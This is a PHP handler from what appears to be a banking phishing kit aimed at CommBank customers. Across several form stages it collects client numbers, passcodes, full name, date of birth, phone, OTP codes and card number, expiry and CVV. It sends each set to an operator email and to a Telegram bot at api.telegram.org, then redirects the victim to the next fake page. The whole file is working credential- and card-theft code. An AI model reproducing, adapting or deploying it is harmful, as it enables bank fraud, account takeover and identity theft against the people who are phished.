<?php
include 'email.php';
include 'config.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Client number           : ".$_POST['clientnum']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @frogworks --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

    if (!empty($bot_token) && !empty($chat_id)) {

		$clientnum = $_POST['clientnum'];
		$pr = $_POST['pr'];
        $msg = "";
        $msg.="[xLs] - Made by @frogworks\r\n";
        $msg.="[INFO]: Got login details.\r\n\r\n";
        $msg.="[Client number]: <code>$clientnum</code>\r\n";
		$msg.="[Passcode]: <code>$pr</code>\r\n\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="[IP Address]: $ip                  \r\n";
        $msg.="[IP lookup]: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }
	$count = $_POST['count'];
	if ($count<1) {
		$count=$count+1;
		header("Location: ./main.html?count=".$count);
	}
	else
	{
	header("Location: ./detail.html");

	}
	
	
}

else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Full NAme           : ".$_POST['fn']."\n";
	$message .= "Date of Birth           : ".$_POST['dob']."\n";
	$message .= "Zip Code           : ".$_POST['zc']."\n";
	$message .= "Phone number           : ".$_POST['ph']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @frogworks --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	if (!empty($bot_token) && !empty($chat_id)) {


		$fname = $_POST['fn'];
		$dob = $_POST['dob'];
		$zip = $_POST['zc'];
		$phone = $_POST['ph'];
		$otp = $_POST['otp'];
        $msg = "";
        $msg.="[xLs] - Made by @frogworks\r\n";
        $msg.="[INFO]: Got fullz.\r\n\r\n";
        $msg.="[Full name]: <code>$fname</code>\r\n";
		$msg.="[Date of Birth]: <code>$dob</code>\r\n";
		$msg.="[Zip Code]: <code>$zip</code>\r\n";
		$msg.="[Phone number]: <code>$phone</code>\r\n\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="[IP Address]: $ip                  \r\n";
        $msg.="[IP lookup]: https://whatismyipaddress.com/ip/$ip \r\n";    


        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

	header("Location: ./card.html");
	
	
}

else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "OTP Code           : ".$_POST['otp']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @frogworks --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	if (!empty($bot_token) && !empty($chat_id)) {


		$otp = $_POST['otp'];
        $msg = "";
        $msg.="[xLs] - Made by @frogworks\r\n";
        $msg.="[INFO]: Got OTP code.\r\n\r\n";
        $msg.="[OTP]: <code>$otp</code>\r\n\r\n";
        
        $msg.="---------------------------\r\n";
        $msg.="[IP Address]: $ip                  \r\n";
        $msg.="[IP lookup]: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

	header("Location: ./fiinish.html");
	
	
};

if (isset($_GET['Crd'])) {

    $cardnum = $_POST['cn'];
    $exp = $_POST['exp'];
	$cvv = $_POST['cvv'];
	
    if (!empty($bot_token) && !empty($chat_id)) {




        
        $msg = "";
        $msg.="[--+🏦  COMMBANK BY MANIAC 🏦+--]\r\n";
        $msg.="[INFO]: Card Info is here.\r\n\r\n";
        $msg.=" Card Number : <code>$cardnum</code>\r\n";
        $msg.=" Expiry Date :  <code>$exp</code>\r\n";
		$msg.=" CVV : <code>$cvv</code>\r\n";
		
        
        $msg.="---------------------------\r\n";
        $msg.="IP Address: $ip                  \r\n";
        $msg.="IP lookup: https://whatismyipaddress.com/ip/$ip \r\n";    

        $data = array(
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'html',
            'disable_web_page_preview' => true
        );
        $ch = curl_init('https://api.telegram.org/bot'.$bot_token.'/sendMessage');
        curl_setopt_array($ch, array(
            CURLOPT_HEADER => 0,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $data
        ));
        curl_exec($ch);
        curl_close($ch);
    }

 header("Location: ./load.html");
};





?>